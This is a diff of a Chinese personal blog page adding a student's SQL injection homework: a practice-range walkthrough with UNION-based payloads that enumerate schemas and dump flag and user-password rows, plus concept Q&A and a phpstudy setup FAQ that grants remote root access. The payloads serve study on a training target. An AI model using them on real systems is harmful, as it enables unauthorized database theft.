@@ -129,7 +129,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-count">6</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -140,7 +140,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">3</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -178,6 +178,311 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="宋卫冬的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/" class="post-title-link" itemprop="url">SQL注入作业</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-11-25 15:42:45" itemprop="dateCreated datePublished" datetime="2021-11-25T15:42:45+08:00">2021-11-25</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-11-26 01:33:39" itemprop="dateModified" datetime="2021-11-26T01:33:39+08:00">2021-11-26</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h3><p>显错注入（一）</p>
+<p>解题思路</p>
+<p>判断是否存在注入：and 1=2<br>判断字段数：order by 4</p>
+<p>找出回显位置：?id=1 and 1=2 union select 1,2,3</p>
+<p>2,3处是回显位置</p>
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211125233836329.png" alt="image-20211125233836329"></p>
+<p>查询数据库：?id=1 and 1=2 union select 1,2,database()</p>
+<p>得到库名是error</p>
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211125231730066.png" alt="image-20211125231730066"></p>
+<h4 id="查询表名："><a href="#查询表名：" class="headerlink" title="查询表名："></a>查询表名：</h4><p>?id=1 and 1=2 union select 1,2,table_name from information_schema.tables where table_schema =’error’ limit 0,1</p>
+<p>易错点：1=2不能写成1 =2   不能有空格！</p>
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211126002420189.png" alt="image-20211126002420189"></p>
+<hr>
+<p>?id=1 and 1=2 union select 1,2,table_name from information_schema.tables where table_schema =’error’ limit 0,2</p>
+<p>得到表名user</p>
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211125234118315.png" alt="image-20211125234118315"></p>
+<h4 id="查询列名："><a href="#查询列名：" class="headerlink" title="查询列名："></a>查询列名：</h4><p>?id=1 and 1=2 union select 1,2,column_name from information_schema.columns where table_name =’user’ limit 0,1</p>
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211126004853082.png" alt="image-20211126004853082"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用group_concat()函数求出user表的所有字段：</span><br></pre></td></tr></table></figure>
+
+<p>?id=1 and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name =’user’ and table_schema = database()</p>
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211126004328507.png" alt="image-20211126004328507"></p>
+<p>?id=1 and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name =’error_flag’ and table_schema = database()</p>
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211126005404938.png" alt="image-20211126005404938"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查询具体数据：</span><br></pre></td></tr></table></figure>
+
+<p>?id=1 and 1=2 union select 1,2,group_concat(flag) from error_flag</p>
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211126005928056.png" alt="image-20211126005928056"></p>
+<p>Your Password:zKaQ-Nf,zKaQ-BJY,zKaQ-XiaoFang,zKaq-98K</p>
+<table>
+<thead>
+<tr>
+<th align="center">error_flag表</th>
+<th align="left"></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><strong>Id</strong></td>
+<td align="left"><strong>flag</strong></td>
+</tr>
+<tr>
+<td align="center">1</td>
+<td align="left">zKaQ-Nf</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="left">zKaQ-BJY</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td align="left">zKaQ-XiaoFang</td>
+</tr>
+<tr>
+<td align="center">4</td>
+<td align="left">zKaq-98K</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="right">user表</th>
+<th align="center"></th>
+<th align="center"></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="right"><strong>Id</strong></td>
+<td align="center"><strong>username</strong></td>
+<td align="center"><strong>password</strong></td>
+</tr>
+<tr>
+<td align="right">1</td>
+<td align="center">test</td>
+<td align="center">mima</td>
+</tr>
+<tr>
+<td align="right">2</td>
+<td align="center">niefeng</td>
+<td align="center">7580241</td>
+</tr>
+<tr>
+<td align="right">3</td>
+<td align="center">ssg</td>
+<td align="center">Nopassword</td>
+</tr>
+</tbody></table>
+<p>笔记本写知识点！！！</p>
+<h3 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h3><p>显错注入（三）</p>
+<p>解题思路</p>
+<h3 id="pass-03"><a href="#pass-03" class="headerlink" title="pass-03"></a>pass-03</h3><p>显错注入（四）</p>
+<p>解题思路</p>
+<h3 id="pass-04"><a href="#pass-04" class="headerlink" title="pass-04"></a>pass-04</h3><p>解题思路</p>
+<h3 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h3><p>解题思路</p>
+<h3 id="pass-06"><a href="#pass-06" class="headerlink" title="pass-06"></a>pass-06</h3><p>POST注入（二）</p>
+<p>解题思路</p>
+<h3 id="pass-07"><a href="#pass-07" class="headerlink" title="pass-07"></a>pass-07</h3><p>Head注入（一）</p>
+<p>解题思路</p>
+<h3 id="pass-08"><a href="#pass-08" class="headerlink" title="pass-08"></a>pass-08</h3><p>Head注入（二）</p>
+<p>解题思路</p>
+<h3 id="pass-09"><a href="#pass-09" class="headerlink" title="pass-09"></a>pass-09</h3><p>Head注入（三）</p>
+<p>解题思路</p>
+<h3 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h3><p>布尔盲注（一）</p>
+<p>解题思路</p>
+<h3 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h3><p>布尔盲注（二）</p>
+<p>解题思路</p>
+<h3 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h3><p>布尔注入（三）</p>
+<p>解题思路</p>
+<h3 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h3><p>延时注入（一）</p>
+<p>解题思路</p>
+<h3 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h3><p>延时注入（二）</p>
+<p>解题思路</p>
+<h3 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h3><p>宽字节注入（一）</p>
+<p>解题思路</p>
+<h3 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h3><p>宽字节注入（二）</p>
+<p>解题思路</p>
+<h3 id="pass-17"><a href="#pass-17" class="headerlink" title="pass-17"></a>pass-17</h3><p>宽字节注入（三）</p>
+<p>解题思路</p>
+<h2 id="注入原理分析"><a href="#注入原理分析" class="headerlink" title="注入原理分析"></a>注入原理分析</h2><h3 id="1、介绍sql注入的原理"><a href="#1、介绍sql注入的原理" class="headerlink" title="1、介绍sql注入的原理"></a>1、介绍sql注入的原理</h3><p>SQL注入是网站存在最多也是比较简单的漏洞，主要原因是程序对用户输入的字符串没有进行过滤或处理不严谨，导致用户可以通过精心构造语句来非法获取数据库中的信息，SQL注入的首次公开讨论始于1998年左右，至今已有20多年的历史，被冠以漏洞之王的称号。</p>
+<p>知道了库名就可以知道表名 知道了表面就可以知道列名</p>
+<p>知道了表面和列名就可以得到表里面的记录（数据）</p>
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211125204259532-16378441811501-16378441852562.png" alt="image-20211125204259532"></p>
+<h3 id="2、靶场演示sql注入的基本流程"><a href="#2、靶场演示sql注入的基本流程" class="headerlink" title="2、靶场演示sql注入的基本流程"></a>2、靶场演示sql注入的基本流程</h3><p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211125204338972.png" alt="image-20211125204338972"></p>
+<h3 id="3、讲解sql注入的中遇到的函数"><a href="#3、讲解sql注入的中遇到的函数" class="headerlink" title="3、讲解sql注入的中遇到的函数"></a>3、讲解sql注入的中遇到的函数</h3><p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211125204358071.png" alt="image-20211125204358071"></p>
+<p>判断是否存在注入：and 1=2<br>判断字段数：order by 2<br>查询数据库：and 1=2 union select 1,database()<br>查询表名：and 1=2 union select 1,table_name from information_schema.tables where table_schema =’maoshe’<br>查询列名：and 1=2 union select 1,column_name from information_schema.columns where table_name =’admin’ limit 2,1<br>查询具体数据：and 1=2 union select 1,password from admin</p>
+<hr>
+<p><img src="/2021/11/25/SQL%E6%B3%A8%E5%85%A5%E4%BD%9C%E4%B8%9A/image-20211125204412998.png" alt="image-20211125204412998"></p>
+<p>4、展示sql注入在实战中的例子</p>
+<p>5、总结</p>
+<h2 id="易错回答分析"><a href="#易错回答分析" class="headerlink" title="易错回答分析"></a>易错回答分析</h2><p>1.sql注入本质是什么</p>
+<p>把用户输入当做代码执行</p>
+<p>2.sql注入的条件</p>
+<p>用户可控输入和原本程序要执行代码，拼接用户输入且当作SQL语句去执行</p>
+<p>3.order by的作用及含义</p>
+<p>order by 用于判断显示位，order by 原有的作用是对字段进行一个排序，在sql注入中用order by 来判断排序，order by 1就是对一个字段进行排序，如果一共四个字段，你order by 5 数据库不知道怎么排序，于是乎就错误了无返回值</p>
+<p>4.union select如何发挥作用</p>
+<p>union为联合查询，a联合b进行了查询，为查询了前面的sql语句(原有的)后再进行后面的sq查询(我们添加的)，但两张表联合查询的字段数必须相同。</p>
+<p>5.输出位是什么</p>
+<p>SQL查询出来的数据不一定全部会输出，页面上只会输出几个字段的信息，那几个会输出的字段就是输出位</p>
+<p>6.information_schema是什么</p>
+<p>information_schema是mysql的系统自带表，用于查询数据，在mysql5.0以上版本中存在</p>
+<p>7.加单引号和加 and 1=2有什么区别</p>
+<p>有区别，单引号是为了闭合语句，而and 1=2是为了让union前面的语句无查询结果无输出，然后直接输出拼接进去union后面的那个语句的查询结果</p>
+<p>\8. and 是什么意思</p>
+<p>and 为和的意思，一个语句中，当前一个正确，后一个错误时，如果是and连接整个语句返回是False</p>
+<p>9.or是什么意思</p>
+<p>Or 为和的意思，一个语句中，当前一个正确，后一个错误时，如果是or连接整个语句返回是True</p>
+<p>10.and 和 or 选择使用有什么讲究？</p>
+<p> And 语句执行时，如果and 前的语句返回False,那么and后面的语句根本不执行</p>
+<p>11.除了单引号外还有其他的符号可以闭合吗？</p>
+<p>实际上还是要看源码，常见的是单引号和双引号还有括号</p>
+<p>12.limit的作用</p>
+<p>limit 在注入中用于排序然后输出，limit a,b a代表了从哪个位置(从0开始) b代表从那位开始显示几条数据</p>
+<p>13.可以查讯多个字段内容吗</p>
+<p>可以，可以使用语句Group_concat()函数进行输出</p>
+<p>14.%23有什么作用</p>
+<p>%23编码为#,用于注释后面的语句,防止SQL注入点后原本的SQL语句对SQL注入进行干扰</p>
+<p>15.报错注入的原理</p>
+<p>利用sql注入拼接sql语句，将报错信息输出时同时将我们想要的信息输出</p>
+<p>16.闭合是什么</p>
+<p>在sql查询中，代码比较严谨，括号和引号都得成双成对，引号内的默认是字符串不会当作SQL语句执行，所以必须闭合然后才能注入，当然有些SQL语句直接拼接，也就不用什么闭合了</p>
+<p>17.SQL注入有数据库限制吗？</p>
+<p>没有，常见的数据库都可以</p>
+<p>18.SQL注入有动态脚本语言限制吗？</p>
+<p>没有限制</p>
+<p>19.SQL注入如果没系统自带表怎么办</p>
+<p>那就惨了，只能通过猜，不断的尝试，一般而言数据库的表也不会乱起名字，毕竟是团队协作的东西</p>
+<p>20.系统自带库管理员不会修改吗？</p>
+<p>一般而言并不会</p>
+<p>21.union all 和 union 区别</p>
+<p>如果输出的数据有相同的，Union只会输出一次，而union all都会输出</p>
+<p>22.为什么用and 1=1正常 and 1=2报错来判断是否存在SQL注入</p>
+<p>因为如果存在SQL注入，那么and就是和的意思，1=1是一个恒等式，然后因为原本能够查出数据，那么两个真就是True，但是1=2肯定是不可能的，这里就会返回一个False,然后因为和必须两个真才返回True,所以这里拼接就不成立返回False.</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/25/hacking/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="宋卫冬的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/11/25/hacking/" class="post-title-link" itemprop="url">hacking</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-11-25 12:01:15" itemprop="dateCreated datePublished" datetime="2021-11-25T12:01:15+08:00">2021-11-25</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/23/%E5%88%9D%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -201,10 +506,16 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2021-11-23 14:23:52 / 修改时间：23:47:27" itemprop="dateCreated datePublished" datetime="2021-11-23T14:23:52+08:00">2021-11-23</time>
+      <time title="创建时间：2021-11-23 14:23:52" itemprop="dateCreated datePublished" datetime="2021-11-23T14:23:52+08:00">2021-11-23</time>
     </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-11-24 21:23:44" itemprop="dateModified" datetime="2021-11-24T21:23:44+08:00">2021-11-24</time>
+      </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-folder"></i>
@@ -225,7 +536,7 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p> 表里面有字段</p>
+          <h2 id="数据库的结构："><a href="#数据库的结构：" class="headerlink" title="数据库的结构："></a>数据库的结构：</h2><p>表里面有字段</p>
 <p>字段里面字段的名称和类型</p>
 <p><img src="/2021/11/23/%E5%88%9D%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93/image-20211123140725717.png" alt="image-20211123140725717"></p>
 <p>表里面还有数据或者说是【记录】</p>
@@ -236,6 +547,39 @@
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;751480137@qq.com&quot;</span><br></pre></td></tr></table></figure>
 
+<h2 id="一、了解什么是动态语言"><a href="#一、了解什么是动态语言" class="headerlink" title="一、了解什么是动态语言"></a>一、了解什么是动态语言</h2><p><img src="/2021/11/23/%E5%88%9D%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93/image-20211124204742611.png" alt="image-20211124204742611"></p>
+<p><img src="/2021/11/23/%E5%88%9D%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93/image-20211124204804905-16377580858581.png" alt="image-20211124204804905"></p>
+<h2 id="二、服务器环境的快速搭建"><a href="#二、服务器环境的快速搭建" class="headerlink" title="二、服务器环境的快速搭建"></a>二、服务器环境的快速搭建</h2><p><img src="/2021/11/23/%E5%88%9D%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93/image-20211124205050684.png" alt="image-20211124205050684"></p>
+<h2 id="三、phpstudy功能介绍"><a href="#三、phpstudy功能介绍" class="headerlink" title="三、phpstudy功能介绍"></a>三、phpstudy功能介绍</h2><p><img src="/2021/11/23/%E5%88%9D%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93/image-20211124205144753.png" alt="image-20211124205144753"></p>
+<h2 id="四、快速搭建一个网站（通过CMS）"><a href="#四、快速搭建一个网站（通过CMS）" class="headerlink" title="四、快速搭建一个网站（通过CMS）"></a>四、快速搭建一个网站（通过CMS）</h2><p><img src="/2021/11/23/%E5%88%9D%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93/image-20211124205202635.png" alt="image-20211124205202635"></p>
+<h2 id><a href="#" class="headerlink" title></a></h2><h2 id="五、易错回答分析"><a href="#五、易错回答分析" class="headerlink" title="五、易错回答分析"></a>五、易错回答分析</h2><p>快速自建Web环境-易错回答分析</p>
+<h3 id="1-phpstdy哪里可以下载？。"><a href="#1-phpstdy哪里可以下载？。" class="headerlink" title="\1. phpstdy哪里可以下载？。"></a>\1. phpstdy哪里可以下载？。</h3><p>可以去官网下载，也可以在群下载，官网下载的是2018版本，我提供的是2016版本</p>
+<h3 id="2-phpstudy切换高版本php需要vc9库怎么办？"><a href="#2-phpstudy切换高版本php需要vc9库怎么办？" class="headerlink" title="\2. phpstudy切换高版本php需要vc9库怎么办？"></a>\2. phpstudy切换高版本php需要vc9库怎么办？</h3><p>老师给你们提供，我会发在群里面，同学们可以自行寻找。</p>
+<h3 id="3-phpstudy傻瓜式安装好后，数据库账号密码是多少？"><a href="#3-phpstudy傻瓜式安装好后，数据库账号密码是多少？" class="headerlink" title="\3. phpstudy傻瓜式安装好后，数据库账号密码是多少？"></a>\3. phpstudy傻瓜式安装好后，数据库账号密码是多少？</h3><p>账号密码都是root (数据库账号和密码必须修改，不然容易被入侵)</p>
+<h3 id="4-如何访问我们快速搭建的web环境？"><a href="#4-如何访问我们快速搭建的web环境？" class="headerlink" title="\4. 如何访问我们快速搭建的web环境？"></a>\4. 如何访问我们快速搭建的web环境？</h3><p>当phpstudy开着中间件的时候直接访问127.0.0.1就可以看到web环境，默认打开的文件是index.html</p>
+<h3 id="5-phpstudy网站根目录在哪里？"><a href="#5-phpstudy网站根目录在哪里？" class="headerlink" title="\5. phpstudy网站根目录在哪里？"></a>\5. phpstudy网站根目录在哪里？</h3><p>网站根目录在phpstudy文件夹下面的www目录（phpstudy 2016版本）</p>
+<h3 id="6-如何访问数据库？"><a href="#6-如何访问数据库？" class="headerlink" title="\6. 如何访问数据库？"></a>\6. 如何访问数据库？</h3><p>我建议使用phpstudy的自带软件，phpmyadmin和mysql-front ，当然命令行也是可以的</p>
+<h3 id="7-如何命令行访问数据库？"><a href="#7-如何命令行访问数据库？" class="headerlink" title="\7. 如何命令行访问数据库？"></a>\7. 如何命令行访问数据库？</h3><p>有些情况下直接选择其他选项中的CMD命令行，然后直接mysql -u root -p 就能访问到数据库，有的时候不行，如果不行的话请你将phpstudy目录下的mysql文件夹下的bin文件夹加入环境变量就行</p>
+<h3 id="8-phpmyadmin默认用户名密码是什么？"><a href="#8-phpmyadmin默认用户名密码是什么？" class="headerlink" title="\8. phpmyadmin默认用户名密码是什么？"></a>\8. phpmyadmin默认用户名密码是什么？</h3><p>就是数据库账号密码 root root</p>
+<h3 id="9-phpstudy中的系统服务和非服务模式有什么区别"><a href="#9-phpstudy中的系统服务和非服务模式有什么区别" class="headerlink" title="\9. phpstudy中的系统服务和非服务模式有什么区别"></a>\9. phpstudy中的系统服务和非服务模式有什么区别</h3><p>系统服务，开机自动启动，非服务模式不会</p>
+<h3 id="10-MYSQL和apache的环境可以分别开关吗"><a href="#10-MYSQL和apache的环境可以分别开关吗" class="headerlink" title="\10. MYSQL和apache的环境可以分别开关吗"></a>\10. MYSQL和apache的环境可以分别开关吗</h3><p>可以，在服务管理器里可以切换.</p>
+<h3 id="11-如何关闭phpstudy？"><a href="#11-如何关闭phpstudy？" class="headerlink" title="\11. 如何关闭phpstudy？"></a>\11. 如何关闭phpstudy？</h3><p>关闭phpstudy必须要点击停止，直接叉掉或者退出或者结束phpstudy进程都没有用，数据库和web服务依旧在运行</p>
+<h3 id="12-数据库密码忘记怎么办？"><a href="#12-数据库密码忘记怎么办？" class="headerlink" title="\12. 数据库密码忘记怎么办？"></a>\12. 数据库密码忘记怎么办？</h3><p>在MYSQL工具里的重置密码</p>
+<h3 id="13-phpstudy可以使用iis吗"><a href="#13-phpstudy可以使用iis吗" class="headerlink" title="\13. phpstudy可以使用iis吗"></a>\13. phpstudy可以使用iis吗</h3><p>当然可以，phpstudy支持多个中间件，Nginx和iis和apache,在版本切换可以看到</p>
+<h3 id="14-phpstudy-80端口被占用怎么办？"><a href="#14-phpstudy-80端口被占用怎么办？" class="headerlink" title="\14. phpstudy 80端口被占用怎么办？"></a>\14. phpstudy 80端口被占用怎么办？</h3><p>在环境端口检测处，关闭占用进程并启动</p>
+<h3 id="15-phpstudy中的网站根目录和数据库存放在同一文件夹？"><a href="#15-phpstudy中的网站根目录和数据库存放在同一文件夹？" class="headerlink" title="\15. phpstudy中的网站根目录和数据库存放在同一文件夹？"></a>\15. phpstudy中的网站根目录和数据库存放在同一文件夹？</h3><p>不在同一文件夹下，根目录在WWW 而数据库在data文件夹下</p>
+<h3 id="16-phpstudy如何切换php版本或者中间件"><a href="#16-phpstudy如何切换php版本或者中间件" class="headerlink" title="\16. phpstudy如何切换php版本或者中间件"></a>\16. phpstudy如何切换php版本或者中间件</h3><p>在php版本的地方进行选择（建议使用5.4.45）</p>
+<h3 id="17-phpstudy可以安装ftp服务吗？"><a href="#17-phpstudy可以安装ftp服务吗？" class="headerlink" title="\17. phpstudy可以安装ftp服务吗？"></a>\17. phpstudy可以安装ftp服务吗？</h3><p>可以，其他选项菜单里的其他高级应用里，有一个ftp管理器里可以进行设置</p>
+<h3 id="18-如何对站点域名进行设置"><a href="#18-如何对站点域名进行设置" class="headerlink" title="\18. 如何对站点域名进行设置"></a>\18. 如何对站点域名进行设置</h3><p>在Mysql管理器选项和其他选项都有，站点域名管理处，可以进行设置</p>
+<h3 id="19-如何尝试一台服务器开多个端口运行多个WEB服务"><a href="#19-如何尝试一台服务器开多个端口运行多个WEB服务" class="headerlink" title="\19. 如何尝试一台服务器开多个端口运行多个WEB服务"></a>\19. 如何尝试一台服务器开多个端口运行多个WEB服务</h3><p>在Mysql管理器选项和其他选项都有，站点域名管理处，可以进行设置</p>
+<h3 id="20-在哪里配置php-ini"><a href="#20-在哪里配置php-ini" class="headerlink" title="\20. 在哪里配置php-ini"></a>\20. 在哪里配置php-ini</h3><p>其它选项菜单,配置文件处，可以找到php-ini (php-ini是php的配置文件)</p>
+<h3 id="21-动态脚本语言和后端语言的区别是什么？"><a href="#21-动态脚本语言和后端语言的区别是什么？" class="headerlink" title="\21. 动态脚本语言和后端语言的区别是什么？"></a>\21. 动态脚本语言和后端语言的区别是什么？</h3><p>动态脚本语言和后端语言是一个东西，常见的有php|aspx|aspx|jsp</p>
+<h3 id="22-你访问你的地址看不到目录信息怎么办？"><a href="#22-你访问你的地址看不到目录信息怎么办？" class="headerlink" title="\22. 你访问你的地址看不到目录信息怎么办？"></a>\22. 你访问你的地址看不到目录信息怎么办？</h3><p>在phpstudy设置中选择允许目录列表</p>
+<h3 id="23-Windows有这样的快速自建环境，linux有吗？"><a href="#23-Windows有这样的快速自建环境，linux有吗？" class="headerlink" title="\23. Windows有这样的快速自建环境，linux有吗？"></a>\23. Windows有这样的快速自建环境，linux有吗？</h3><p>当然有，linux有一个lnmp，实际上都是集成环境~</p>
+<h3 id="24-我们使用了phpstudy快速搭建了web环境，如何快速搭建网站？"><a href="#24-我们使用了phpstudy快速搭建了web环境，如何快速搭建网站？" class="headerlink" title="\24. 我们使用了phpstudy快速搭建了web环境，如何快速搭建网站？"></a>\24. 我们使用了phpstudy快速搭建了web环境，如何快速搭建网站？</h3><p>有一种东西叫做CMS，我们只需要将网上下载的CMS源码放入WWW文件夹，然后访问安装的文件夹就可以快速建站</p>
+<h3 id="25-数据库如何开启外连？"><a href="#25-数据库如何开启外连？" class="headerlink" title="\25. 数据库如何开启外连？"></a>\25. 数据库如何开启外连？</h3><p>mysql工具栏的命令行，打开选择数据库mysql,输入 grant all privileges on <em>.</em> to root@’%’ identified by ‘你的root密码’; 执行flush privileges; 检查是否开启3306 </p>
+<h3 id="26-iis是不是只能运行asp或者aspx"><a href="#26-iis是不是只能运行asp或者aspx" class="headerlink" title="\26. iis是不是只能运行asp或者aspx?"></a>\26. iis是不是只能运行asp或者aspx?</h3><p>并不是的，我就装过插件让iis6.0运行php</p>
+<p>注：25个问题总结考虑到多方面因素，有基础有进阶，并不是说该课程必须掌握的25个地方，只是遇到问题看看是否在这里方便学习！！！</p>
 
       
     </div>
